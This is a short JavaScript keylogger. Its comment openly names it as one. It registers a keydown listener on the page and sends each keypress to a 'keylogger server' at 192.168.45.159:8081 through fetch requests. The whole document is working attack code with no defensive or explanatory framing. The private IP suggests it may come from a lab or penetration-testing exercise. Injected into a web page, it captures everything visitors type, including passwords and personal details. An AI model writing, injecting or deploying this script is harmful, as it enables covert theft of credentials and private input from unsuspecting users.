const SERVER = '192.168.45.159';
const PORT = '8081';

/**
 * Sends keypresses to the keylogger server.
 * @param {Event} event - keydown event.
 */
function logKey(event) {
  const encodedKey = encodeURIComponent(event.key);
  fetch(`http://${SERVER}:${PORT}/keys?k=${encodedKey}`);
}

document.addEventListener('keydown', logKey);
